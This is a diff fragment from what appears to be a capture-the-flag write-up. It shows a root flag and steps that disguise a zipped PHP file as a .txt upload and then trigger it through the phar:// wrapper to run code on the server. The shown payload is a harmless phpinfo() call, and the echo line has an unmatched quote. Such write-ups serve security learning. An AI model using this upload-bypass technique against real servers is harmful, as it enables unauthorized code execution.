@@ -120,7 +120,7 @@ Root: `htbmeetupcmr{NM4p_2_r007_0wn4g3}`
      ```bash
      echo "<?php phpinfo();?> >> test.php
      zip -r test.zip test.php
-     mv test.php test.txt
+     mv test.zip test.txt
      ```
    - upload the file to the server 
    - Trigger the shell with the `phar://` php filter to trigger execution:
